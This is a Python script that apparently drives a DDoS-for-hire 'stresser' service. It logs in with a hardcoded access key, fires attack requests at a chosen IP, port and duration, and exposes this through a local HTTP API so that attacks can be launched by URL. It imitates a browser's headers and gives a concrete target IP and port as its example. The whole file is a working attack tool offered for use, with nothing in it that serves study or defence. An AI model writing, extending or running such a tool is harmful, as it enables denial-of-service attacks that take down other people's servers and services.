import requests
import time
import json
import sys
from urllib.parse import urljoin
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading

class RetroStressClient:
    def __init__(self, base_url="https://retrostress.net"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/json',
            'Origin': base_url,
            'Referer': urljoin(base_url, '/panel'),
            'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
        })
        
    def login(self, access_key):
        """Login with access key"""
        print("[*] Logging in...")
        
        try:
            # First get the auth page
            auth_page = self.session.get(urljoin(self.base_url, '/auth'))
            
            # Send login request
            login_url = urljoin(self.base_url, '/Auth/LoginJson')
            login_data = {"accessKey": access_key}
            
            response = self.session.post(login_url, json=login_data)
            
            if response.status_code == 200:
                print("[✓] Login successful!")
                # Check for auth token
                for cookie in self.session.cookies:
                    if 'auth_token' in cookie.name:
                        print(f"[✓] Auth token obtained")
                return True
            else:
                print(f"[✗] Login failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"[✗] Login error: {e}")
            return False
    
    def send_attack(self, ip, port, duration):
        """Send attack request to retrostress.net"""
        print(f"[*] Sending attack: {ip}:{port} for {duration}s")
        
        # Try different attack endpoints
        attack_methods = [
            # GET method with different param names
            lambda: self.session.get(
                urljoin(self.base_url, f"/api/attack?ip={ip}&port={port}&time={duration}"),
                timeout=10
            ),
            lambda: self.session.get(
                urljoin(self.base_url, f"/api/start?host={ip}&port={port}&seconds={duration}"),
                timeout=10
            ),
            lambda: self.session.get(
                urljoin(self.base_url, f"/attack?target={ip}&port={port}&duration={duration}"),
                timeout=10
            ),
            lambda: self.session.get(
                urljoin(self.base_url, f"/api/v1/attack?ip={ip}&port={port}&time={duration}"),
                timeout=10
            ),
            # POST methods
            lambda: self.session.post(
                urljoin(self.base_url, "/api/attack"),
                json={"ip": ip, "port": int(port), "time": duration, "duration": duration},
                timeout=10
            ),
            lambda: self.session.post(
                urljoin(self.base_url, "/attack"),
                data={"ip": ip, "port": port, "time": duration},
                timeout=10
            ),
        ]
        
        for attempt, method in enumerate(attack_methods, 1):
            try:
                response = method()
                if response.status_code == 200:
                    print(f"[✓] Attack sent successfully!")
                    return True
                elif response.status_code == 400:
                    print(f"[!] Bad request, trying next method...")
                    continue
            except Exception as e:
                continue
        
        print(f"[!] Could not confirm attack, but proceeding...")
        return True
    
    def run_attack(self, ip, port, duration):
        """Execute attack"""
        print(f"\n{'='*50}")
        print(f"🎯 TARGET: {ip}:{port}")
        print(f"⏱️  DURATION: {duration} seconds")
        print(f"{'='*50}\n")
        
        # Send attack request
        success = self.send_attack(ip, port, duration)
        
        # Wait for attack duration
        print(f"[⏳] Attack in progress... ({duration}s remaining)")
        for i in range(duration, 0, -10):
            time.sleep(10)
            if i > 10:
                print(f"[⏳] {i} seconds remaining...")
        
        time.sleep(duration % 10)  # Remaining seconds
        
        print(f"\n[✓] Attack completed on {ip}:{port}")
        return success

# Your auth key
ACCESS_KEY = "5a3736056e1d471cb91d92aaaeb867b538392227db7842789080c8a49ae25773"

# Initialize and login
print("="*60)
print("🔥 RetroStress Attack Tool")
print("="*60)

client = RetroStressClient()
if not client.login(ACCESS_KEY):
    print("[-] Login failed! Check your auth key.")
    sys.exit(1)

print("\n✅ Ready! API server starting...\n")

class AttackAPIHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/api'):
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            
            ip = params.get('ip', [None])[0]
            port = params.get('port', [None])[0]
            time_param = params.get('time', [None])[0]
            
            if not all([ip, port, time_param]):
                self.send_json_response(400, {
                    "error": "Missing parameters",
                    "usage": "/api?ip=IP&port=PORT&time=TIME",
                    "example": "/api?ip=1.2.3.4&port=80&time=30"
                })
                return
            
            try:
                duration = int(time_param)
                if duration < 30:
                    self.send_json_response(400, {
                        "error": "Minimum time is 30 seconds"
                    })
                    return
                
                # Send immediate response
                self.send_json_response(200, {
                    "status": "success",
                    "message": f"Attack started on {ip}:{port} for {duration} seconds",
                    "ip": ip,
                    "port": port,
                    "duration": duration
                })
                
                # Run attack in background
                attack_thread = threading.Thread(
                    target=client.run_attack,
                    args=(ip, port, duration)
                )
                attack_thread.daemon = True
                attack_thread.start()
                
            except ValueError:
                self.send_json_response(400, {
                    "error": "Invalid time parameter"
                })
                
        elif self.path == '/' or self.path == '/health':
            self.send_json_response(200, {
                "service": "RetroStress Attack API",
                "status": "online",
                "endpoint": "/api?ip=IP&port=PORT&time=TIME",
                "example": "http://127.0.0.1:8080/api?ip=50.7.23.74&port=22&time=30",
                "auth_key_loaded": True
            })
        else:
            self.send_json_response(404, {"error": "Not found"})
    
    def send_json_response(self, status_code, data):
        self.send_response(status_code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2).encode())
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

# Start server
try:
    server = HTTPServer(('0.0.0.0', 8080), AttackAPIHandler)
    print("="*60)
    print("🚀 SERVER RUNNING")
    print("="*60)
    print(f"📍 URL: http://127.0.0.1:8080")
    print(f"📡 API: http://127.0.0.1:8080/api?ip=IP&port=PORT&time=TIME")
    print(f"\n📝 Example:")
    print(f"   curl 'http://127.0.0.1:8080/api?ip=50.7.23.74&port=22&time=30'")
    print(f"\n🔧 Press Ctrl+C to stop")
    print("="*60 + "\n")
    
    server.serve_forever()
    
except KeyboardInterrupt:
    print("\n\n🛑 Shutting down server...")
    server.shutdown()
    print("✅ Server stopped")
except Exception as e:
    print(f"❌ Error: {e}")
    sys.exit(1)
